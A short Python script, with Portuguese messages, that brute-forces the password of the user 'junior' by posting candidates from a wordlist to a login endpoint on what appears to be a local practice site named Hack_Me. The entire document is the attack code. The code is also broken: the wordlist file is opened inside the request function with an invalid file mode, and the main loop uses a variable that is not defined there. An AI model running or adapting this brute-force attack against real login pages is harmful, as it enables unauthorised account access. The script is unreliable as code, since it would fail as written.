import requests
url = "http://localhost/Hack_Me"
login_url = url+"/api/Login.php"
arquivo = "junior.txt"
usuario = "junior"
def request(user, password):
    data = {"nome": user, "senha": password}
    r = requests.post(login_url, data=data)
    if "Logue novamente" in r.text:
        print("Nao foi possivel achar a senha!!")
    else:
        print("A senha e: "+user + " | "+ password)
        wordlist = open(arquivo, "junior.txt")
for i in wordlist:
    print("Testando "+ usuario + " || " + i)
    request(usuario,i)
    print("===============================")
